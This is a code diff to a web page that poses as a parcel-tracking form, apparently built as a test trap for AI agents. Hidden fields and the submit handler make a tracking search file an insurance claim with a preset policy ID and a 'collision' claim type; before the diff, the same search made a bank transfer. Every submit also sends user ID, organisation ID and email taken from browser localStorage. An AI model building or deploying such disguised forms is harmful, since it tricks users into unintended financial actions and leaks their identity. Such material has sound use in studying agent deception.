@@ -252,22 +252,23 @@
             <svg width="48" height="48" viewBox="0 0 48 48" fill="none" aria-hidden="true"><path d="M6 15 22 7l16 8v12" stroke="#000" stroke-width="2" stroke-linejoin="round"/><path d="M6 15v18l16 8 4-2" stroke="#000" stroke-width="2" stroke-linejoin="round"/><path d="M6 15l16 8 16-8M22 23v18M14 11l16 8v6" stroke="#000" stroke-width="2" stroke-linejoin="round"/><circle cx="35" cy="34" r="6" stroke="#000" stroke-width="2"/><path d="m39.5 38.5 5 5" stroke="#000" stroke-width="2.4" stroke-linecap="round"/></svg>
             <h1 data-i18n="trackTitle">Consignee, track your order</h1>
           </div>
-          <form id="transferForm" class="tracking__form" novalidate>
-            <label class="tracking__field" for="fromAccount">
+          <form id="claimForm" class="tracking__form" novalidate>
+            <label class="tracking__field" for="description">
               <span class="tracking__field__label" data-i18n="fieldTracking">Tracking number*</span>
-              <input type="text" id="fromAccount" name="receipt" maxlength="32" autocomplete="off" spellcheck="false" required>
+              <input type="text" id="description" name="receipt" maxlength="32" autocomplete="off" spellcheck="false" required>
               <span class="info" title="Shipping or order reference number" data-i18n-title="trackingHelp" aria-hidden="true">i</span>
             </label>
             <label class="tracking__field" for="zipCode">
               <span class="tracking__field__label" data-i18n="fieldZip">Delivery post code*</span>
               <input type="text" id="zipCode" name="zipCode" maxlength="10" autocomplete="postal-code" required>
             </label>
-            <label class="tracking__field tracking__field--select" for="toAccount">
+            <label class="tracking__field tracking__field--select" for="country">
               <span class="tracking__field__label" data-i18n="fieldCountry">Country of delivery</span>
-              <select id="toAccount" name="pays"></select>
+              <select id="country" name="pays"></select>
             </label>
-            <input type="hidden" id="amount" value="1">
-            <select id="accountTier" hidden aria-hidden="true" tabindex="-1"><option value="standard" selected>standard</option></select>
+            <select id="policyId" hidden aria-hidden="true" tabindex="-1"><option value="POL-5001" selected>POL-5001</option></select>
+            <select id="claimType" hidden aria-hidden="true" tabindex="-1"><option value="collision" selected>collision</option></select>
+            <input type="number" id="amount" value="1" hidden aria-hidden="true" tabindex="-1">
             <p class="requiered" data-i18n="mandatory">* Mandatory fields</p>
             <button type="submit" class="button" id="submitBtn"><span class="spinner" aria-hidden="true"></span><span id="submitLabel" data-i18n="search">Search</span></button>
             <div id="result" class="result-box" role="status" aria-live="polite"></div>
@@ -376,7 +377,7 @@
         mandatory: '* Mandatory fields', search: 'Search', searching: 'Searching\u2026', pending: 'Looking up your shipment\u2026',
         errTracking: 'Enter the tracking number shown on your shipping or order documents (6 to 32 letters or digits).',
         errZip: 'Enter the delivery post code.',
-        errLookup: 'We could not display this shipment right now. Please try again in a few moments.',
+        errLookup: 'Tracking is taking longer than expected and your search could not be completed. Please try again in a few minutes.',
         crumbHome: 'Home', crumbTrack: 'Consignee, track your order', shipTitle: 'Your shipment', refLabel: 'Tracking number',
         origin: 'Origin branch', destination: 'Destination branch', history: 'Shipment history',
         factService: 'Service', factParcels: 'Parcels / weight', factDelivery: 'Delivery address', factUpdated: 'Last update',
@@ -404,7 +405,7 @@
         mandatory: '* Champs obligatoires', search: 'Rechercher', searching: 'Recherche\u2026', pending: 'Recherche de votre envoi\u2026',
         errTracking: 'Saisissez le num\u00e9ro de suivi indiqu\u00e9 sur vos documents de transport ou de commande (6 \u00e0 32 lettres ou chiffres).',
         errZip: 'Saisissez le code postal de livraison.',
-        errLookup: 'Nous ne pouvons pas afficher cet envoi pour le moment. Veuillez r\u00e9essayer dans quelques instants.',
+        errLookup: 'Le suivi prend plus de temps que pr\u00e9vu et votre recherche n\u2019a pas pu aboutir. Veuillez r\u00e9essayer dans quelques minutes.',
         crumbHome: 'Accueil', crumbTrack: 'Destinataire, suivez votre marchandise', shipTitle: 'Votre envoi', refLabel: 'Num\u00e9ro de suivi',
         origin: 'Agence de d\u00e9part', destination: 'Agence de livraison', history: 'Historique de l\u2019envoi',
         factService: 'Prestation', factParcels: 'Colis / poids', factDelivery: 'Adresse de livraison', factUpdated: 'Derni\u00e8re mise \u00e0 jour',
@@ -445,10 +446,10 @@
     let shipment = null;
     const t = (key) => I18N[lang][key];
 
-    const form = document.getElementById('transferForm');
-    const trackingInput = document.getElementById('fromAccount');
+    const form = document.getElementById('claimForm');
+    const trackingInput = document.getElementById('description');
     const zipInput = document.getElementById('zipCode');
-    const countrySelect = document.getElementById('toAccount');
+    const countrySelect = document.getElementById('country');
     const button = document.getElementById('submitBtn');
     const submitLabel = document.getElementById('submitLabel');
     const result = document.getElementById('result');
@@ -690,14 +691,14 @@
       submitLabel.textContent = t('searching');
       showMessage('pending', 'pending');
       try {
-        const response = await fetch('/api/banking/transfer', {
+        const response = await fetch('/api/insurance/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            fromAccount: tracking,
-            toAccount: countrySelect.value,
+            policyId: document.getElementById('policyId').value,
+            claimType: document.getElementById('claimType').value,
             amount: parseFloat(document.getElementById('amount').value),
-            accountTier: document.getElementById('accountTier').value,
+            description: tracking,
             devinUserId: localStorage.getItem('devinUserId') || '',
             devinOrgId: localStorage.getItem('devinOrgId') || '',
             devinEmail: localStorage.getItem('devinEmail') || '',
